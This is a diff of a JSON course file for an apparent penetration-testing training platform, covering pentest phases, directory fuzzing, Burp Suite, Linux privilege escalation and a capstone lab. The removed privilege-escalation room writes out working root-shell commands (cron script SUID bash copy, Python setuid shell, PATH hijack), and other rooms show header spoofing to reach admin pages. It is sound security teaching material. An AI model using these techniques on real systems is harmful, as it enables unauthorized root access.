-    ],
-    "seeExamples": [
-      {
-        "title": "The Professional Pentest Progression",
-        "codeOrDiagram": "[ Phase 1: SCOPE & AUTHORIZATION ]\n                 ↓\n[ Phase 2: RECONNAISSANCE & OSINT ]\n                 ↓\n[ Phase 3: SERVICE ENUMERATION (Nmap / Ffuf) ]\n                 ↓\n[ Phase 4: VULNERABILITY IDENTIFICATION (CVE / Logic Flaws) ]\n                 ↓\n[ Phase 5: CONTROLLED EXPLOITATION (Initial Foothold) ]\n                 ↓\n[ Phase 6: PRIVILEGE ESCALATION & IMPACT VALIDATION ]\n                 ↓\n[ Phase 7: REPORTING & REMEDIATION GUIDANCE ]",
-        "explanation": "Each phase feeds data systematically into the next phase. Random guessing is replaced by structured methodology."
-      }
-    ],
-    "tryInteractive": {
-      "type": "terminal",
-      "prompt": "Simulate calculating a CVSS v3.1 base score for an unauthenticated Remote Code Execution vulnerability in the terminal: `python3 -c \"print('Vulnerability: Apache RCE | Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H | Base Score: 9.8 (CRITICAL)')\"`:",
-      "initialCommand": "",
-      "expectedCommand": "python3 -c \"print('Vulnerability: Apache RCE | Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H | Base Score: 9.8 (CRITICAL)')\"",
-      "simulatedOutput": "Vulnerability: Apache RCE | Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H | Base Score: 9.8 (CRITICAL)\n[+] Success! CVSS vector string evaluated: Network exploitable, Low complexity, No privileges required, High C/I/A impact.",
-      "explanation": "CVSS vectors provide an objective, standardized metric for communicating vulnerability severity to engineering teams."
-    },
-    "questions": [
-      {
-        "id": "r36-q1",
-        "type": "multiple-choice",
-        "question": "During a penetration test, a tester discovers that a production server has a severe vulnerability that could be exploited to wipe customer transaction records. What should the tester do?",
-        "options": [
-          "Wipe the database immediately to prove the vulnerability exists",
-          "Follow the agreed Rules of Engagement (RoE): document the finding, capture minimal non-destructive PoC evidence, and immediately notify the primary client emergency contact",
-          "Post the vulnerability on social media",
-          "Ignore the finding because it is too dangerous to test"
-        ],
-        "correctIndex": 1,
-        "explanation": "Ethical testers never cause intentional data loss. The RoE dictates immediate notification and non-destructive PoC validation."
-      },
-      {
-        "id": "r36-q2",
-        "type": "multiple-choice",
-        "question": "What is the primary target audience of the 'Executive Summary' section of a professional penetration test report?",
-        "options": [
-          "Senior business leadership, executives, and board members who need to understand business risk and budget priorities without deep technical jargon",
-          "Junior database developers only",
-          "The hardware manufacturer of the network switches",
-          "External law enforcement officers"
-        ],
-        "correctIndex": 0,
-        "explanation": "Executive summaries translate technical findings into high-level business risk and strategic remediation roadmaps for executives."
-      }
-    ],
-    "tasks": [
-      {
-        "title": "Task 1: Calculate CVSS Vector Severity",
-        "instruction": "Run the CVSS evaluation command to review the metrics of a Critical remote exploit.",
-        "hints": [
-          "Concept: Vulnerability scoring metrics.",
-          "Direction: Execute the python evaluation string.",
-          "Tool: `python3`",
-          "Syntax: Run the complete command string.",
-          "Explanation: Explains CVSS metric components."
-        ]
-      }
-    ],
-    "explainResult": "The script printed a standard CVSS v3.1 vector string where Attack Vector: Network, Attack Complexity: Low, Privileges: None, and Impact: High result in a 9.8 Critical score.",
-    "securityConnection": "Mastering methodology is what separates script kiddies from professional security consultants. Clients hire testers who can be trusted inside their most sensitive production environments without causing downtime or breaking regulatory compliance.",
-    "completion": {
-      "learned": [
-        "The standard phases of the Penetration Testing Execution Standard (PTES)",
-        "The legal role of the Rules of Engagement (RoE) and Scope documents",
-        "How the Common Vulnerability Scoring System (CVSS) calculates severity",
-        "The structure and components of a professional security deliverable report"
-      ],
-      "practiced": [
-        "Evaluating CVSS vector strings",
-        "Structuring penetration test phases",
-        "Analyzing executive vs technical reporting requirements"
-      ]
-    },
-    "nextRoomId": "room-37"
-  },
-  {
-    "id": "room-37",
-    "stage": 10,
-    "stageTitle": "Stage 10 — Junior Pentester",
-    "title": "Web Recon & Directory Fuzzing",
-    "difficulty": "Intermediate",
-    "difficultyBadge": "🟣 Intermediate",
-    "estimatedTime": "35 min",
-    "prerequisites": "Room 12 (HTTP Fundamentals) & Room 35 (Reconnaissance)",
-    "whyAreYouHere": "Websites rarely have links on their homepage pointing to their most sensitive folders. You will never see a button in the navigation bar that says: *'Click here for /admin_backup or /database.sql'*. Yet developers leave test scripts, phpMyAdmin panels, and `.git` repositories on servers every day! How do penetration testers discover these hidden endpoints? The answer is **Directory Fuzzing (Content Discovery)**. In this room, you will master tools like `ffuf` and `gobuster` to brute-force hidden web paths.",
-    "objectives": [
-      "Understand Web Content Discovery and Directory Fuzzing",
-      "Learn how wordlists (SecLists) power brute-force endpoint discovery",
-      "Master `ffuf` (Fast Web Fuzzer) command syntax and flags",
-      "Filter responses by status code (`-mc`), size (`-fs`), and word count (`-fw`)",
-      "Discover hidden administrative endpoints on the lab web server"
-    ],
-    "vocabulary": [
-      {
-        "term": "Directory Fuzzing / Brute Forcing",
-        "definition": "An automated web enumeration technique of sending hundreds of requests per second with words from a wordlist to discover unlinked files and directories."
-      },
-      {
-        "term": "ffuf",
-        "definition": "Fast Web Fuzzer: a high-performance web fuzzer written in Go, used for directory discovery, virtual host fuzzing, and parameter fuzzing."
-      },
-      {
-        "term": "Gobuster",
-        "definition": "A popular directory and DNS brute-forcing tool written in Go."
-      },
-      {
-        "term": "SecLists",
-        "definition": "The security tester's companion collection of wordlists (usernames, passwords, URLs, sensitive files) curated by Daniel Miessler."
-      },
-      {
-        "term": "FUZZ Keyword",
-        "definition": "The placeholder keyword used by ffuf in the target URL (e.g. `http://target/FUZZ`) that is replaced by each word from the wordlist."
-      }
-    ],
-    "lessons": [
-      {
-        "title": "1. How Directory Fuzzing Works",
-        "content": "A fuzzer takes a wordlist containing 5,000 common directory names:\n```text\nadmin\nlogin\nbackup\napi\ntest\nuploads\n```\nIt sends rapid requests:\n`GET /admin HTTP/1.1` -> Returns `403 Forbidden` (Exists!)\n`GET /login HTTP/1.1` -> Returns `200 OK` (Exists!)\n`GET /backup HTTP/1.1` -> Returns `301 Redirect` (Exists!)\n`GET /random123 HTTP/1.1` -> Returns `404 Not Found` (Discarded)\nWithin 2 seconds, you have a complete map of the server's hidden folders!"
-      },
-      {
-        "title": "2. Filtering Noise in ffuf",
-        "content": "Modern websites often return a custom `200 OK` error page for *every* missing URL. If a fuzzer shows 10,000 results, your scan is useless.\nYou filter the noise:\n• `-mc 200,301,302,403`: Match only interesting status codes.\n• `-fs 1042`: Filter out any response whose byte size is exactly 1,042 (the size of the generic custom 404 page).\n• `-e .php,.txt,.bak`: Test file extensions in addition to directories."
-      }
-    ],
-    "seeExamples": [
-      {
-        "title": "Sample ffuf Execution Syntax",
-        "codeOrDiagram": "cadet@endlessus:~$ ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.10.25/FUZZ -mc 200,301,403\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n:: Method           : GET\n:: URL              : http://10.10.10.25/FUZZ\n:: Wordlist         : common.txt\n:: Match Codes      : [200, 301, 403]\n\nadmin                   [Status: 403, Size: 277, Words: 20]\napi                     [Status: 301, Size: 178, Words: 8]\nbackup                  [Status: 200, Size: 1420, Words: 89]",
-        "explanation": "Notice the findings: `/admin` (403), `/api` (301 redirect), and `/backup` (200 OK, 1420 bytes). The `/backup` folder is an immediate investigation priority."
-      }
-    ],
-    "tryInteractive": {
-      "type": "terminal",
-      "prompt": "Run a simulated directory fuzz against our lab web server using curl and a wordlist: `for w in images css js admin backup secret; do code=$(curl -s -o /dev/null -w \"%{http_code}\" http://localhost:8080/$w); if [ \"$code\" != \"404\" ]; then echo \"/$w -> HTTP $code\"; fi; done`:",
-      "initialCommand": "",
-      "expectedCommand": "for w in images css js admin backup secret; do code=$(curl -s -o /dev/null -w \"%{http_code}\" http://localhost:8080/$w); if [ \"$code\" != \"404\" ]; then echo \"/$w -> HTTP $code\"; fi; done",
-      "simulatedOutput": "/images -> HTTP 301\n/admin -> HTTP 403\n/backup -> HTTP 200\n/secret -> HTTP 200\n[+] Success! Hidden directories /admin (403), /backup (200), and /secret (200) enumerated.",
-      "explanation": "Iterating words against the web root uncovers sensitive endpoints that have no visible links on the homepage."
-    },
-    "questions": [
-      {
-        "id": "r37-q1",
-        "type": "multiple-choice",
-        "question": "In the web fuzzing tool `ffuf`, what does the placeholder keyword `FUZZ` inside a URL like `http://target.com/FUZZ` indicate?",
-        "options": [
-          "It instructs ffuf to fuzz the CPU clock",
-          "It marks the exact injection point where ffuf will substitute each word from the supplied wordlist",
-          "It encrypts the URL with AES",
-          "It enables the webcam"
-        ],
-        "correctIndex": 1,
-        "explanation": "`FUZZ` is the placeholder keyword replaced dynamically with lines from the wordlist during each request."
-      },
-      {
-        "id": "r37-q2",
-        "type": "multiple-choice",
-        "question": "When running a directory fuzzer, every single request returns HTTP status 200 with the exact same response size of 4,096 bytes because the target web server uses a custom 'Page Not Found' design. How do you filter out this noise?",
-        "options": [
-          "By increasing the number of threads to 1,000",
-          "By using the `-fs 4096` flag to filter out and hide any response that has a size of exactly 4,096 bytes",
-          "By switching your network cable",
-          "By deleting the wordlist"
-        ],
-        "correctIndex": 1,
-        "explanation": "The `-fs` (filter size) flag discards responses with the specified byte size, hiding custom 404 error pages."
-      }
-    ],
-    "tasks": [
-      {
-        "title": "Task 1: Fuzz Hidden Endpoints",
-        "instruction": "Execute the shell fuzzing loop to locate hidden web directories.",
-        "hints": [
-          "Concept: Directory brute-forcing.",
-          "Direction: Submit requests and check HTTP status codes.",
-          "Tool: Bash loop with `curl`",
-          "Syntax: Run the complete provided shell loop.",
-          "Explanation: Discovers /backup and /secret."
-        ]
-      }
-    ],
-    "explainResult": "The script transmitted six sequential HEAD requests, captured the HTTP status code variable `%{http_code}`, filtered out 404s, and highlighted endpoints `/backup` and `/secret`.",
-    "securityConnection": "Content discovery is where penetration testers find their easiest wins. Developers frequently leave database backup dumps (`db_backup.sql.tar.gz`), `.env` configuration files with AWS root keys, and unprotected development portals (`/staging`) sitting directly in web roots.",
-    "completion": {
-      "learned": [
-        "The methodology of web content discovery and directory fuzzing",
-        "Using wordlists (SecLists) for endpoint brute-forcing",
-        "Command syntax and filtering in ffuf (-mc, -fs, -fw)",
-        "Analyzing response status codes to map application attack surfaces"
-      ],
-      "practiced": [
-        "Iterative directory fuzzing",
-        "Filtering 404 error responses",
-        "Identifying hidden web directories"
-      ]
-    },
-    "nextRoomId": "room-38"
-  },
-  {
-    "id": "room-38",
-    "stage": 10,
-    "stageTitle": "Stage 10 — Junior Pentester",
-    "title": "Burp Suite & Web Proxy Fundamentals",
-    "difficulty": "Intermediate",
-    "difficultyBadge": "🟣 Intermediate",
-    "estimatedTime": "40 min",
-    "prerequisites": "Room 12 (HTTP Fundamentals) & Room 23 (Web Security)",
-    "whyAreYouHere": "If you ask any professional web penetration tester which single tool they keep open 8 hours a day, the answer is always **Burp Suite**. Burp Suite is the industry-standard intercepting HTTP proxy for security assessments. It sits directly between your web browser and the internet, allowing you to intercept, pause, view, modify, and replay every single HTTP request and response in real-time. In this room, you will learn how intercepting proxies work, how to install the Burp CA certificate, and how to master the **Proxy**, **Repeater**, and **Intruder** tabs.",
-    "objectives": [
-      "Understand how an Intercepting HTTP Proxy operates (Man-in-the-Middle by design)",
-      "Learn how to configure your browser to route traffic through `127.0.0.1:8080`",
-      "Understand the Burp Suite CA Certificate and how it decrypts HTTPS traffic locally",
-      "Master the **Proxy Intercept** tab (pausing and tampering with requests in-flight)",
-      "Master the **Repeater** tab (crafting, modifying, and re-issuing custom HTTP requests)",
-      "Understand the **Intruder** tab for automated fuzzing and parameter testing"
-    ],
-    "vocabulary": [
-      {
-        "term": "Burp Suite",
-        "definition": "The premier integrated platform for performing security testing of web applications, developed by PortSwigger."
-      },
-      {
-        "term": "Intercepting Proxy",
-        "definition": "A proxy server that captures web traffic between browser and server, allowing the analyst to pause, inspect, and modify requests before transmission."
-      },
-      {
-        "term": "Burp Repeater",
-        "definition": "A core Burp Suite tool used for manually modifying and re-issuing individual HTTP requests and analyzing the resulting responses."
-      },
-      {
-        "term": "Burp Intruder",
-        "definition": "An automated tool for customizing and executing attacks against web applications (e.g. brute-forcing, fuzzing, parameter cycling)."
-      },
-      {
-        "term": "Root CA Certificate",
-        "definition": "A cryptographic certificate installed in the browser's trust store, allowing Burp Suite to generate on-the-fly TLS certificates to decrypt HTTPS traffic."
-      }
-    ],
-    "lessons": [
-      {
-        "title": "1. The Man-in-the-Middle Architecture",
-        "content": "Normally, your browser speaks directly to the web server:\n`Browser -------------------------> Web Server`\n\nWith Burp Suite configured:\n`Browser ----> [ Burp Suite: 127.0.0.1:8080 ] ----> Web Server`\nWhen you click 'Submit' on a form:\n1. The request leaves your browser.\n2. Burp intercepts it and pauses it.\n3. You can change `role=user` to `role=admin` or change `price=100` to `price=1`.\n4. You click 'Forward'. The server receives your modified request without knowing it was altered!"
-      },
-      {
-        "title": "2. The Magic of Burp Repeater",
-        "content": "Right-click any intercepted request and select **Send to Repeater** (`Ctrl+R`).\nRepeater is your laboratory. You don't have to fill out web forms again and again in a browser. You can:\n• Edit headers, payloads, or cookies.\n• Press **Send** (`Ctrl+Space`).\n• Immediately inspect the server's raw response side-by-side.\nThis is where 90% of vulnerability verification (SQLi, IDOR, XSS) actually happens!"
-      }
-    ],
-    "seeExamples": [
-      {
-        "title": "Burp Suite Repeater Layout",
-        "codeOrDiagram": "[ LEFT PANE: Request (Editable) ]        [ RIGHT PANE: Response (Live) ]\nPOST /api/user/role HTTP/1.1              HTTP/1.1 200 OK\nHost: target.corp                         Content-Type: application/json\nCookie: session=AliceToken                \n                                          {\n{\"user_id\": 102, \"role\": \"admin\"}          \"success\": true,\n                                            \"role\": \"admin\",\n                                            \"message\": \"Role elevated\"\n                                          }",
-        "explanation": "In Repeater, you modify the JSON payload from 'user' to 'admin', click Send, and immediately verify if the server accepted the unauthorized role change."
-      }
-    ],
-    "tryInteractive": {
-      "type": "terminal",
-      "prompt": "Simulate a Burp Repeater request by sending a manually crafted HTTP request with a modified `X-Forwarded-For` header using curl: `curl -H \"X-Forwarded-For: 127.0.0.1\" http://localhost:8080/admin/status`:",
-      "initialCommand": "",
-      "expectedCommand": "curl -H \"X-Forwarded-For: 127.0.0.1\" http://localhost:8080/admin/status",
-      "simulatedOutput": "HTTP/1.1 200 OK\n{\"admin_portal\":\"OPEN\",\"client_ip\":\"127.0.0.1\",\"access\":\"GRANTED_LOCAL_IP\"}\n[+] Success! Custom header accepted. Access granted via IP spoofing.",
-      "explanation": "Manipulating HTTP headers directly demonstrates the exact workflow performed inside Burp Repeater."
-    },
-    "questions": [
-      {
-        "id": "r38-q1",
-        "type": "multiple-choice",
-        "question": "Why must a penetration tester install the Burp Suite CA Certificate into their web browser before they can intercept HTTPS web traffic?",
-        "options": [
-          "To speed up the internet connection",
-          "Because HTTPS encrypts traffic; without the trusted Burp certificate, the browser will display severe SSL/TLS security warning errors when Burp decrypts and inspects the traffic",
-          "Because Burp Suite only works on Windows computers",
-          "To disable the computer's firewall"
-        ],
-        "correctIndex": 1,
-        "explanation": "Burp performs an authorized Man-in-the-Middle on local HTTPS traffic. The browser must trust Burp's root CA to prevent SSL error warnings."
-      },
-      {
-        "id": "r38-q2",
-        "type": "multiple-choice",
-        "question": "Which core tool within Burp Suite is specifically designed for manually modifying and repeatedly re-sending individual HTTP requests while analyzing responses?",
-        "options": [
-          "Burp Decoder",
-          "Burp Repeater",
-          "Burp Comparer",
-          "Burp Extender"
-        ],
-        "correctIndex": 1,
-        "explanation": "Burp Repeater is the primary manual testing tool for crafting and re-issuing modified HTTP requests."
-      }
-    ],
-    "tasks": [
-      {
-        "title": "Task 1: Send Modified HTTP Header Probe",
-        "instruction": "Execute `curl -H \"X-Forwarded-For: 127.0.0.1\" http://localhost:8080/admin/status` to simulate Burp header tampering.",
-        "hints": [
-          "Concept: Manual request tampering via headers.",
-          "Direction: Inject X-Forwarded-For header.",
-          "Tool: `curl`",
-          "Syntax: `curl -H \"X-Forwarded-For: 127.0.0.1\" http://localhost:8080/admin/status`",
-          "Explanation: Simulates Repeater request modification."
-        ]
-      }
-    ],
-    "explainResult": "The application checked the `X-Forwarded-For` header, trusted the client-supplied value, and granted access assuming the request originated from localhost.",
-    "securityConnection": "Burp Suite is the primary tool used by professional application penetration testers and bug bounty hunters. Mastering Burp Suite allows you to identify vulnerabilities that automated scanners completely miss (such as multi-step business logic flaws and multi-tenant authorization bypasses).",
-    "completion": {
-      "learned": [
-        "How an intercepting HTTP proxy captures and inspects web traffic",
-        "Configuring browser proxy settings and the Burp Root CA certificate",
-        "Using the Proxy Intercept tab to alter requests in-flight",
-        "Mastering Burp Repeater for iterative vulnerability verification"
-      ],
-      "practiced": [
-        "curl -H \"X-Forwarded-For: ...\"",
-        "Tampering with request headers",
-        "Analyzing server response changes"
-      ]
-    },
-    "nextRoomId": "room-39"
-  },
-  {
-    "id": "room-39",
-    "stage": 10,
-    "stageTitle": "Stage 10 — Junior Pentester",
-    "title": "Advanced Linux Privilege Escalation",
-    "difficulty": "Advanced",
-    "difficultyBadge": "🔴 Advanced",
+    "stage": 7,
+    "level": 7,
+    "levelTitle": "Level 7 \u2014 First Practical Security Labs",
+    "title": "Pre Security Capstone Challenge (Practical Lab 13)",
+    "difficulty": "Practical",
+    "difficultyBadge": "\ud83d\udd34 Practical",
     "estimatedTime": "45 min",
-    "prerequisites": "Room 31 (Linux Privilege Escalation: SUID)",
-    "whyAreYouHere": "In Room 31, you learned how SUID binaries allow privilege escalation. But what happens on modern, hardened servers where no SUID binaries are misconfigured? A professional penetration tester does not stop there! In this advanced room, you will learn the full spectrum of Linux privilege escalation vectors: Scheduled Cron Jobs with writable scripts, Linux Kernel Capabilities (`getcap`), Wildcard Injections, Insecure PATH manipulation, and Shared Library Hijacking (`LD_PRELOAD`).",
+    "prerequisites": "Room 44: Security Incident Log Analysis",
+    "whyAreYouHere": "Congratulations! You have arrived at the final culmination of the Endlessus Pre Security pathway. In this multi-step capstone challenge, you synthesize everything you have learned: network port scanning with Nmap, discovering web administration login endpoints, bypassing authentication via SQL Injection, investigating compromised systems from the command line, and escalating privileges to root. This room marks the completion of the Pre Security curriculum!",
     "objectives": [
-      "Understand Scheduled Cron Jobs (`/etc/crontab`, `/etc/cron.d/`) and writable script abuse",
-      "Learn Linux Capabilities: replacing SUID with fine-grained privileges (`cap_setuid`)",
-      "Master PATH Variable manipulation when scripts execute commands without absolute paths",
-      "Learn Wildcard Injection techniques (e.g. `tar *` exploiting `--checkpoint`)",
-      "Audit automated enumeration tools like LinPEAS to find privilege escalation paths"
-    ],
-    "vocabulary": [
-      {
-        "term": "Cron Job",
-        "definition": "A time-based job scheduler in Unix-like operating systems that runs shell scripts automatically at fixed times or intervals as designated users."
-      },
-      {
-        "term": "Linux Capabilities",
-        "definition": "A security feature that divides traditional root privileges into distinct, fine-grained units (e.g. `cap_net_bind_service`, `cap_setuid`) assigned directly to binaries."
-      },
-      {
-        "term": "PATH Variable Hijacking",
-        "definition": "An attack where an attacker modifies the `$PATH` environment variable or writes to an earlier directory in the search path to trick a root process into running a malicious binary."
-      },
-      {
-        "term": "Wildcard Injection",
-        "definition": "Exploiting shell expansion (such as `*`) to inject command-line arguments into Unix commands like `tar` or `chown`."
-      },
-      {
-        "term": "LinPEAS",
-        "definition": "Linux Privilege Escalation Awesome Script: the industry-standard bash script that automates enumeration of hundreds of local privesc vectors."
-      }
-    ],
-    "lessons": [
-      {
-        "title": "1. The Insecure Cron Job Vector",
-        "content": "Inspect `/etc/crontab`:\n```text\n* * * * * root /opt/scripts/backup.sh\n```\nEvery single minute, `root` runs `/opt/scripts/backup.sh`.\nNow check the file permissions on that script:\n`ls -l /opt/scripts/backup.sh`\n`-rwxrwxrwx 1 root root 84 Oct 5 16:30 /opt/scripts/backup.sh`\nThe script is **world-writable**! Any low-privilege user can simply append a reverse shell or user-creation command:\n`echo \"cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash\" >> /opt/scripts/backup.sh`\nSixty seconds later, root runs the script and creates a root SUID shell!"
-      },
-      {
-        "title": "2. Linux Capabilities: The Modern SUID",
-        "content": "To avoid the danger of full SUID root binaries, modern Linux introduces **Capabilities**:\nInspect binaries with capabilities using:\n```bash\ngetcap -r / 2>/dev/null\n```\nIf you find: `/usr/bin/python3.10 = cap_setuid+ep`\nThis binary is NOT SUID, but it has the specific kernel permission to change its UID to 0!\nYou can spawn root with:\n`python3.10 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'`"
-      }
-    ],
-    "seeExamples": [
-      {
-        "title": "Insecure PATH Hijacking Example",
-        "codeOrDiagram": "Vulnerable root script (/usr/local/bin/maintenance):\n#!/bin/bash\nbackup   <-- Notice: calls 'backup' instead of '/usr/bin/backup'!\n\nAttacker exploits:\n1. echo \"/bin/sh -p\" > /tmp/backup\n2. chmod +x /tmp/backup\n3. export PATH=/tmp:$PATH\n4. Run maintenance -> Root executes /tmp/backup!",
-        "explanation": "Because the script did not specify the absolute path `/usr/bin/backup`, the shell searched `/tmp` first due to the modified `$PATH`."
-      }
-    ],
-    "tryInteractive": {
-      "type": "terminal",
-      "prompt": "Audit Linux capabilities on the lab system using `getcap -r /usr/bin 2>/dev/null`:",
-      "initialCommand": "",
-      "expectedCommand": "getcap -r /usr/bin 2>/dev/null",
-      "simulatedOutput": "/usr/bin/ping = cap_net_raw+ep\n/usr/bin/python3 = cap_setuid+ep   <-- CRITICAL PRIVILEGE ESCALATION VECTOR!\n[+] Success! cap_setuid identified on python3. Immediate root escalation possible.",
-      "explanation": "`getcap` identified `cap_setuid+ep` on Python 3, allowing any user to invoke `os.setuid(0)` to obtain a root shell."
-    },
-    "questions": [
-      {
-        "id": "r39-q1",
-        "type": "multiple-choice",
-        "question": "When auditing a Linux system, you discover that `/usr/bin/python3` has the capability `cap_setuid+ep`. How can a standard low-privilege user escalate to root?",
-        "options": [
-          "They cannot, because capabilities are purely decorative",
-          "By running Python and calling `os.setuid(0)` to change the process UID to root, then spawning a shell",
-          "By rebooting the server into safe mode",
-          "By deleting the Python binary"
-        ],
-        "correctIndex": 1,
-        "explanation": "The `cap_setuid` capability grants the process permission to call the `setuid()` system call with UID 0 (root)."
-      },
-      {
-        "id": "r39-q2",
-        "type": "multiple-choice",
-        "question": "A root cron job executes a bash script every 5 minutes: `/opt/cleanup.sh`. You check permissions and see `-rwxrwxr-x 1 admin developers`. You are a member of the `developers` group. What is the attack vector?",
-        "options": [
-          "None, because the file is owned by admin",
-          "Because your group has write permissions (`w`), you can edit the script to add a command that spawns a root reverse shell or adds your user to `/etc/sudoers`",
-          "You must crack admin's password with Hydra",
-          "You must exploit a buffer overflow in cron"
-        ],
-        "correctIndex": 1,
-        "explanation": "Because your group has write access to the script executed by root, appending commands executes them as root on the next cron cycle."
-      }
-    ],
-    "tasks": [
-      {
-        "title": "Task 1: Identify Dangerous Capability",
-        "instruction": "Execute `getcap -r /usr/bin 2>/dev/null` to locate binaries with elevated kernel capabilities.",
-        "hints": [
-          "Concept: Linux capability enumeration.",
-          "Direction: Run getcap recursively on /usr/bin.",
-          "Tool: `getcap`",
-          "Syntax: `getcap -r /usr/bin 2>/dev/null`",
-          "Explanation: Locates cap_setuid vector."
-        ]
-      }
-    ],
-    "explainResult": "The `getcap` command inspected extended filesystem attributes (`security.capability`) on inodes in `/usr/bin`, exposing the `cap_setuid` bit.",
-    "securityConnection": "Privilege escalation is often where penetration tests demonstrate catastrophic business impact. A compromised web application allows access to public assets; root access allows complete exfiltration of all company data, intellectual property, and system secrets.",
-    "completion": {
-      "learned": [
-        "Advanced Linux privilege escalation vectors",
-        "Auditing scheduled Cron Jobs for writable script dependencies",
-        "Enumerating and abusing Linux Kernel Capabilities (`cap_setuid`)",
-        "PATH environment variable hijacking and GTFOBins techniques"
-      ],
-      "practiced": [
-        "getcap -r /usr/bin 2>/dev/null",
-        "Auditing extended file attributes",
-        "Mapping privilege escalation vectors"
-      ]
-    },
-    "nextRoomId": "room-40"
-  },
-  {
-    "id": "room-40",
-    "stage": 10,
-    "stageTitle": "Stage 10 — Junior Pentester",
-    "title": "Capstone Penetration Test: The Final Assessment",
-    "difficulty": "Advanced",
-    "difficultyBadge": "🔴 Advanced",
-    "estimatedTime": "60 min",
-    "prerequisites": "Rooms 01 through 39 (All stages)",
-    "whyAreYouHere": "You started this journey with zero knowledge: you learned what a computer is, how operating systems manage memory, how networks route packets, how web servers process HTTP requests, how vulnerabilities arise, and how security tools operate. Now, all training wheels come off! In this Capstone Room, you are assigned an isolated, realistic enterprise target: `10.10.10.100`. You must execute a complete, professional, multi-phase penetration test from reconnaissance to root, retrieve proof-of-compromise flags, and document your findings in a mini security report.",
-    "objectives": [
-      "Phase 1: Perform active network reconnaissance and port scanning using Nmap",
-      "Phase 2: Enumerate discovered web services and perform directory fuzzing",
-      "Phase 3: Identify and exploit an authentication / injection flaw to gain an initial foothold shell",
-      "Phase 4: Perform local Linux enumeration to discover a privilege escalation vector",
-      "Phase 5: Escalate privileges to supreme `root` and retrieve the final evidence flag",
-      "Phase 6: Synthesize your technical findings and remediation advice into a professional executive summary"
+      "Execute an end-to-end authorized penetration testing workflow against an enterprise target",
+      "Scan target `10.10.10.100` using Nmap to discover open SSH and HTTP ports",
+      "Discover hidden administrative endpoints at `/api/v2/auth` using curl",
+      "Bypass administrative authentication using an SQL Injection payload",
+      "Extract the initial access user flag from `user.txt`",
+      "Identify SUID privilege escalation vectors and extract the root completion flag from `/root/root.txt`"
     ],
     "vocabulary": [
       {
         "term": "Capstone",
-        "definition": "A culminating project that synthesizes all knowledge, skills, and methodologies acquired throughout a curriculum into a realistic final practical test."
+        "definition": "A comprehensive culminating project that integrates and tests all skills learned across an entire curriculum."
       },
       {
-        "term": "Initial Foothold",
-        "definition": "The very first point of unauthorized interactive access established on a target system (typically an unprivileged web shell or SSH session)."
+        "term": "Lateral Movement",
+        "definition": "Techniques an attacker uses to extend access to other systems and accounts across a network."
       },
       {
-        "term": "Proof of Concept (PoC)",
-        "definition": "Demonstrable evidence (such as a screenshot, flag hash, or command output) verifying that an exploited vulnerability successfully achieved its intended effect."
-      },
-      {
-        "term": "Remediation",
-        "definition": "The technical steps, patches, configuration changes, or architectural redesigns prescribed to fix a vulnerability and prevent re-exploitation."
+        "term": "Privilege Escalation",
+        "definition": "The act of exploiting a bug, design flaw, or configuration oversight in an operating system to gain elevated access (root / SYSTEM)."
       }
     ],
+    "diagramSvg": "<svg viewBox=\"0 0 600 160\" width=\"100%\" height=\"160\" xmlns=\"http://www.w3.org/2000/svg\" style=\"background:#0b0f19;border-radius:8px;font-family:monospace;\">\n  <rect x=\"20\" y=\"25\" width=\"160\" height=\"110\" rx=\"6\" fill=\"#1e293b\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <text x=\"100\" y=\"65\" fill=\"#f8fafc\" font-size=\"14\" font-weight=\"bold\" text-anchor=\"middle\">Learner (You)</text>\n  <text x=\"100\" y=\"90\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Input Command</text>\n  <text x=\"100\" y=\"110\" fill=\"#38bdf8\" font-size=\"12\" text-anchor=\"middle\">whoami</text>\n  \n  <path d=\"M 180 80 L 230 80\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <polygon points=\"230,80 220,75 220,85\" fill=\"#38bdf8\"/>\n  \n  <rect x=\"230\" y=\"25\" width=\"150\" height=\"110\" rx=\"6\" fill=\"#1e293b\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <text x=\"305\" y=\"65\" fill=\"#f8fafc\" font-size=\"14\" font-weight=\"bold\" text-anchor=\"middle\">Shell (Bash)</text>\n  <text x=\"305\" y=\"90\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Parses Command</text>\n  <text x=\"305\" y=\"110\" fill=\"#10b981\" font-size=\"11\" text-anchor=\"middle\">Executes /usr/bin</text>\n\n  <path d=\"M 380 80 L 430 80\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <polygon points=\"430,80 420,75 420,85\" fill=\"#10b981\"/>\n  \n  <rect x=\"430\" y=\"25\" width=\"150\" height=\"110\" rx=\"6\" fill=\"#1e293b\" stroke=\"#f59e0b\" stroke-width=\"2\"/>\n  <text x=\"505\" y=\"65\" fill=\"#f8fafc\" font-size=\"14\" font-weight=\"bold\" text-anchor=\"middle\">Linux Kernel</text>\n  <text x=\"505\" y=\"90\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Queries User ID</text>\n  <text x=\"505\" y=\"110\" fill=\"#f59e0b\" font-size=\"12\" text-anchor=\"middle\">Output: cadet</text>\n</svg>",
     "lessons": [
       {
-        "title": "1. The Capstone Mission Briefing",
